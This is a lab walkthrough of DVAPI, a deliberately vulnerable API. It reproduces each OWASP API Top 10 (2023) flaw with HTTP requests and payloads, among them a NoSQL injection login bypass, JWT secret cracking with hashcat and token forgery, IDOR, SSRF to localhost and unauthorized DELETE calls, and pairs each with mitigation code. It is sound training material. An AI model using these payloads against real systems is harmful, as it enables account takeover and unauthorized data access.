# DVAPI — OWASP API Top 10 Walkthrough

> **Disclaimer:** This walkthrough is intended for educational purposes only. All findings were discovered against a local, intentionally vulnerable application. Never test techniques against systems you do not own or have explicit permission to test.

---

## Table of Contents

1. [API1:2023 — Broken Object Level Authorization (BOLA)](#api12023--broken-object-level-authorization-bola)
2. [API2:2023 — Broken Authentication](#api22023--broken-authentication)
3. [API3:2023 — Broken Object Property Level Authorization (Mass Assignment)](#api32023--broken-object-property-level-authorization-mass-assignment)
4. [API4:2023 — Unrestricted Resource Consumption](#api42023--unrestricted-resource-consumption)
5. [API5:2023 — Broken Function Level Authorization (BFLA)](#api52023--broken-function-level-authorization-bfla)
6. [API6:2023 — Server-Side Request Forgery (SSRF)](#api62023--server-side-request-forgery-ssrf)
7. [API7:2023 — Security Misconfiguration](#api72023--security-misconfiguration)
8. [API8:2023 — Unsafe Consumption of APIs (NoSQLi)](#api82023--unsafe-consumption-of-apis-nosqli)
9. [API9:2023 — Lack of Protection from Automated Threats](#api92023--lack-of-protection-from-automated-threats)
10. [API10:2023 — Improper Assets Management](#api102023--improper-assets-management)

---

## API1:2023 — Broken Object Level Authorization (BOLA)

| Field | Detail |
|---|---|
| **Vulnerability** | Broken Object Level Authorization (BOLA / IDOR) |
| **Endpoint** | `GET /api/getNote?username=` |
| **Severity** | High |

### Summary

The `/api/getNote` endpoint accepts a `username` query parameter to identify which user's notes to return. Because the server does not verify that the requesting user matches the requested username, any authenticated user can read another user's notes simply by substituting a different username in the URL.

### Steps to Reproduce

1. Create a DVAPI account and log in.

2. Navigate to your profile page and intercept the outgoing request. Notice it includes your own username as a query parameter:

```http
GET /api/getNote?username=user123 HTTP/1.1
Host: 192.168.1.9:3000
Authorization: Bearer <your-token-here>
Referer: http://192.168.1.9:3000/profile
```

3. Navigate to the **Scoreboard** page and identify the `admin` username.

4. Resend the request with the `username` parameter changed to `admin`:

```http
GET /api/getNote?username=admin HTTP/1.1
Host: 192.168.1.9:3000
Authorization: Bearer <your-token-here>
```

The server returns the admin user's notes without any authorization check.

![BOLA - admin notes exposed](https://github.com/user-attachments/assets/d14d4515-7433-4291-bbb1-60c729df2284)

### Mitigation

Derive the target username exclusively from the authenticated session (e.g., the JWT `sub` claim) — never from a user-controlled query parameter. The endpoint should ignore any `username` input and serve only the data belonging to the currently authenticated user:

```javascript
// FIXED — use identity from verified token, not from query string
router.get('/api/getNote', authenticate, (req, res) => {
    const username = req.user.username; // from verified JWT, not req.query
    // ...fetch and return notes for this username only
});
```

---

## API2:2023 — Broken Authentication

| Field | Detail |
|---|---|
| **Vulnerability** | Weak JWT Secret / Broken Authentication |
| **Endpoint** | `GET /api/profile` |
| **Severity** | Critical |

### Summary

The application signs JWT tokens with a weak, guessable secret (`secret123`). An attacker who recovers this secret via offline brute-force can forge tokens with modified claims — such as elevating `isAdmin` to `true` — and gain administrative access.

### Steps to Reproduce

1. Create a DVAPI account and navigate to `/api/profile`. Capture the JWT from the `Authorization` header or `auth` cookie.

2. Brute-force the JWT secret offline using [this wordlist](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list) and Hashcat:

```bash
hashcat -a 0 -m 16500 <your-JWT-here> /path/to/jwt.secrets.list
```

The cracked secret is: **`secret123`**

3. In Burp Suite's **JWT Editor** extension, create a new Symmetric Key:
   - Click **New Symmetric Key** → **Generate**
   - Replace the value of the `k` property with the Base64-encoded secret (`c2VjcmV0MTIz`)

4. In the **Repeater** tab, open the **JSON Web Token** sub-tab for your captured request:
   - Change `"isAdmin"` from `"false"` to `"true"`
   - Click **Sign** at the bottom and select your generated key

5. Send the request with the modified token:

```http
GET /api/profile HTTP/1.1
Host: 192.168.1.9:3000
Authorization: Bearer <forged-token-with-isAdmin-true>
```

The server accepts the forged token and grants admin-level access.

![Broken Authentication - isAdmin forged](https://github.com/user-attachments/assets/1401d54c-5511-4a17-8029-3d989fc4c493)

### Mitigation

- Use a cryptographically random secret of at least 256 bits. Example: `node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"`
- Never store sensitive authorization claims like `isAdmin` in the JWT payload. Derive privilege from the database at request time using the user ID from the token.
- Consider switching to asymmetric signing (RS256 / ES256) so the signing key never needs to be shared.

---

## API3:2023 — Broken Object Property Level Authorization (Mass Assignment)

| Field | Detail |
|---|---|
| **Vulnerability** | Mass Assignment / Broken Object Property Level Authorization (BOPLA) |
| **Endpoint** | `POST /api/register` (or equivalent registration endpoint) |
| **Severity** | High |

### Summary

The user registration endpoint does not restrict which JSON fields it will accept and bind to the new user object. By injecting an extra `score` field into the registration request body, an attacker can set an arbitrary score for their account — manipulating the scoreboard.

### Steps to Reproduce

1. Intercept the registration request and add the following field to the JSON body:

```json
{
  "username": "attacker",
  "password": "password123",
  "score": 2000
}
```

![Mass Assignment - score injected at registration](https://github.com/user-attachments/assets/3679f516-d9b0-4543-9727-ef8492cd0074)

2. Log in with the newly created account.

3. Navigate to the **Scoreboard** page — the account now appears with a score of `2000`.

![Scoreboard showing injected score](https://github.com/user-attachments/assets/b397ab35-b333-4548-8c34-c3da2254fb61)

### Mitigation

Use an explicit allowlist of permitted fields during object creation. Never pass raw request body data directly to the database model:

```javascript
// FIXED — only bind permitted fields
const { username, password } = req.body; // ignore "score" and any other extra fields
const newUser = new User({ username, password, score: 0 }); // score always starts at 0
```

---

## API4:2023 — Unrestricted Resource Consumption

| Field | Detail |
|---|---|
| **Vulnerability** | Unrestricted Resource Consumption (No file size limit) |
| **Endpoint** | Profile file upload |
| **Severity** | Medium |

### Summary

The profile file upload functionality does not enforce any limit on file size. An attacker can repeatedly upload large files to exhaust server storage, memory, or bandwidth — potentially causing a denial of service.

### Steps to Reproduce

1. Log in to the application.

2. Navigate to the **Profile** page and use the file upload feature.

3. Upload a file of approximately **20 MB** (or larger). The server accepts the upload without rejecting or truncating it.

### Mitigation

Enforce strict server-side limits on file uploads — client-side validation alone is insufficient:

- Set a maximum file size (e.g., 5 MB) and reject requests that exceed it with `413 Payload Too Large`.
- Restrict accepted MIME types and validate file contents server-side, not just by extension.
- Apply rate limiting to the upload endpoint to prevent abuse through repeated requests.

```javascript
// Example using multer (Node.js)
const upload = multer({
    limits: { fileSize: 5 * 1024 * 1024 }, // 5 MB max
    fileFilter: (req, file, cb) => {
        const allowed = ['image/jpeg', 'image/png'];
        cb(null, allowed.includes(file.mimetype));
    }
});
```

---

## API5:2023 — Broken Function Level Authorization (BFLA)

| Field | Detail |
|---|---|
| **Vulnerability** | Broken Function Level Authorization (BFLA) |
| **Endpoint** | `DELETE /api/user/{user}` |
| **Severity** | High |

### Summary

The user lookup endpoint (`GET /api/user/{user}`) also accepts the `DELETE` HTTP method, which is not restricted to admin users. Any authenticated user can delete arbitrary accounts by sending a `DELETE` request to this endpoint.

### Steps to Reproduce

1. Log in to your account.

2. Navigate to the **Scoreboard**, click on any user, and capture the resulting request:

```http
GET /api/user/someuser HTTP/1.1
Host: 192.168.1.9:3000
Authorization: Bearer <your-token-here>
```

3. Change the request method to `OPTIONS` to probe which methods are permitted:

```http
OPTIONS /api/user/someuser HTTP/1.1
Host: 192.168.1.9:3000
```

The response `Allow` header reveals that `DELETE` is permitted.

4. Send a `DELETE` request targeting any user:

```http
DELETE /api/user/someuser HTTP/1.1
Host: 192.168.1.9:3000
Authorization: Bearer <your-token-here>
```

The targeted user account is deleted successfully.

![BFLA - user deleted by non-admin](https://github.com/user-attachments/assets/92dc06a1-8d60-4d59-9faa-71d069529abb)

### Mitigation

Restrict destructive HTTP methods (e.g., `DELETE`, `PUT`) to privileged roles using middleware:

```javascript
// FIXED — only admins may delete users
router.delete('/api/user/:username', authenticate, requireAdmin, (req, res) => {
    // delete user logic
});
```

Additionally, disable or block the `OPTIONS` method in production to avoid disclosing the attack surface.

---

## API6:2023 — Server-Side Request Forgery (SSRF)

| Field | Detail |
|---|---|
| **Vulnerability** | Server-Side Request Forgery (SSRF) |
| **Endpoint** | Add Note (profile page) |
| **Severity** | High |

### Summary

The "Add Note" feature accepts a URL as input and fetches its contents server-side without any restriction on the target host. An attacker can supply an internal address to probe services on the server's local network that would otherwise be inaccessible.

### Steps to Reproduce

1. Log in to your account and navigate to the **Profile** page.

2. In the **Add Note** input field, enter an internal URL:

```
http://localhost:8443
```

3. Submit the note. The server fetches the internal URL and returns its response content.

![SSRF - internal service probed via note URL](https://github.com/user-attachments/assets/cfdc80ce-a95a-4d0b-a244-6b7986a3f479)

### Mitigation

- Validate and allowlist the scheme and hostname of any user-supplied URL before making a server-side request. Reject requests targeting loopback addresses, private IP ranges (RFC 1918), and link-local addresses.
- Use a dedicated HTTP client that does not follow redirects to internal hosts.
- If the feature does not need to fetch arbitrary URLs, restrict input to plain text notes only.

---

## API7:2023 — Security Misconfiguration

| Field | Detail |
|---|---|
| **Vulnerability** | Security Misconfiguration — Improper JWT Validation |
| **Endpoint** | Any authenticated endpoint |
| **Severity** | High |

### Summary

The application does not properly validate the JWT signature. When a token is submitted with a modified `isAdmin` field (invalidating the signature), the server still accepts it and processes the request — meaning signature verification is either skipped or non-fatal.

### Steps to Reproduce

1. Log in to your account and capture any authenticated request.

2. Manually modify the JWT payload — change `"isAdmin": "false"` to `"isAdmin": "true"` — without re-signing the token (producing an invalid signature).

3. Send the request with the tampered token. The server accepts it and grants elevated privileges.

![Security Misconfiguration - invalid JWT accepted](https://github.com/user-attachments/assets/b6023ead-5db0-47ca-8c7b-f4cba998e374)

### Mitigation

Always verify the JWT signature before trusting any claim in the payload. Use a well-maintained library and ensure that verification errors result in a `401 Unauthorized` response:

```javascript
// FIXED — always verify; reject on any error
jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
    if (err) return res.status(401).json({ error: 'Invalid token' });
    req.user = decoded;
    next();
});
```

Never use `jwt.decode()` (which skips verification) in place of `jwt.verify()`.

---

## API8:2023 — Unsafe Consumption of APIs (NoSQLi)

| Field | Detail |
|---|---|
| **Vulnerability** | NoSQL Injection |
| **Endpoint** | `POST /api/login` (or equivalent) |
| **Severity** | Critical |

### Summary

The login endpoint passes user-supplied JSON directly into a MongoDB query without sanitization. By injecting a MongoDB comparison operator into the `password` field, an attacker can authenticate as any user — including `admin` — without knowing their password.

### Steps to Reproduce

1. Navigate to the **Login** page and intercept the request.

2. Replace the request body with the following NoSQLi payload:

```json
{
  "username": "admin",
  "password": { "$ne": null }
}
```

The `$ne` (not equal) operator causes the query to match any account where the password is not `null` — which is always true — bypassing authentication entirely.

3. Send the request. The server logs you in as `admin`.

![NoSQLi - admin login without password](https://github.com/user-attachments/assets/a18d5733-366f-446f-be76-a48876f681b1)

### Mitigation

- Validate and sanitize all user input before constructing database queries. Ensure that the `password` field is always treated as a plain string, never as a nested object.
- Use a library such as [mongo-sanitize](https://www.npmjs.com/package/mongo-sanitize) to strip MongoDB operators from user input.
- Apply a JSON schema that rejects non-string values for login fields.

```javascript
// FIXED — reject non-string password values
if (typeof req.body.password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
}
```

---

## API9:2023 — Lack of Protection from Automated Threats

| Field | Detail |
|---|---|
| **Vulnerability** | No Rate Limiting / Lack of Protection from Automated Threats |
| **Endpoint** | Ticket submission |
| **Severity** | Medium |

### Summary

The ticket submission endpoint does not enforce any rate limiting. An attacker can use an automated tool to submit an unlimited number of tickets in rapid succession, consuming server resources and potentially overwhelming backend systems or support queues.

### Steps to Reproduce

1. Log in to your account.

2. Navigate to the ticket submission feature, add a ticket, and capture the request in Burp Suite.

3. Right-click the request and send it to **Turbo Intruder**.

4. Launch the attack — the server accepts all requests without any throttling or rejection.

![No rate limiting - tickets submitted rapidly](https://github.com/user-attachments/assets/2e7c1c8d-b31e-4376-b186-2d755a07a57c)

### Mitigation

Implement server-side rate limiting on all submission endpoints:

- Limit requests per user per time window (e.g., max 10 ticket submissions per minute per account).
- Return `429 Too Many Requests` with a `Retry-After` header when the limit is exceeded.
- Consider CAPTCHA challenges for high-frequency or unauthenticated endpoints.

```javascript
const rateLimit = require('express-rate-limit');

const ticketLimiter = rateLimit({
    windowMs: 60 * 1000, // 1 minute
    max: 10,
    message: { error: 'Too many requests, please try again later.' }
});

router.post('/api/ticket', authenticate, ticketLimiter, createTicket);
```

---

## API10:2023 — Improper Assets Management

| Field | Detail |
|---|---|
| **Vulnerability** | Improper Assets Management — Unreleased Feature Exposure |
| **Endpoint** | `GET /api/challenges` (or equivalent) |
| **Severity** | Medium |

### Summary

The challenges endpoint filters content based on a `released` parameter in the request, but this filter is controlled by the client rather than enforced server-side. By changing `released: 1` to `released: 0` (or `unreleased`), an attacker can access challenges that have not yet been officially published.

### Steps to Reproduce

1. Log in to your account and navigate to the **Challenges** page. Capture the outgoing API request — note it includes `"released": 1` in the request body or query.

2. Modify the parameter to request unreleased content:

```json
{
  "released": 0
}
```

or, depending on the API:

```
GET /api/challenges?released=unreleased
```

3. Send the modified request. The server returns challenge data that was not intended to be publicly accessible yet.

![Improper Assets Management - unreleased challenges exposed](https://github.com/user-attachments/assets/9be03573-80c5-47bb-8ea6-bd6430f0a265)

### Mitigation

- Never trust client-supplied filters for access control decisions. The `released` flag should be hardcoded server-side — the API should only ever return `released = true` content to non-admin users, regardless of request parameters.
- Maintain a clear inventory of all API endpoints and their intended audience. Remove or gate access to endpoints serving pre-release content behind admin-only authentication.

```javascript
// FIXED — released filter is always enforced server-side
router.get('/api/challenges', authenticate, (req, res) => {
    const challenges = db.challenges.find({ released: true }); // never from req.query
    res.json(challenges);
});
```

---

## Summary Table

| # | OWASP Category | Vulnerability | Endpoint | Severity |
|---|---|---|---|---|
| 1 | API1:2023 | Broken Object Level Authorization | `GET /api/getNote` | High |
| 2 | API2:2023 | Broken Authentication (Weak JWT Secret) | `GET /api/profile` | Critical |
| 3 | API3:2023 | Mass Assignment | `POST /api/register` | High |
| 4 | API4:2023 | Unrestricted Resource Consumption | File upload | Medium |
| 5 | API5:2023 | Broken Function Level Authorization | `DELETE /api/user/{user}` | High |
| 6 | API6:2023 | Server-Side Request Forgery | Add Note | High |
| 7 | API7:2023 | Security Misconfiguration (No JWT Verification) | All authenticated endpoints | High |
| 8 | API8:2023 | NoSQL Injection | `POST /api/login` | Critical |
| 9 | API9:2023 | No Rate Limiting | Ticket submission | Medium |
| 10 | API10:2023 | Improper Assets Management | `GET /api/challenges` | Medium |

---

*Generated against DVAPI — a deliberately insecure API designed to demonstrate the OWASP API Security Top 10 (2023).*
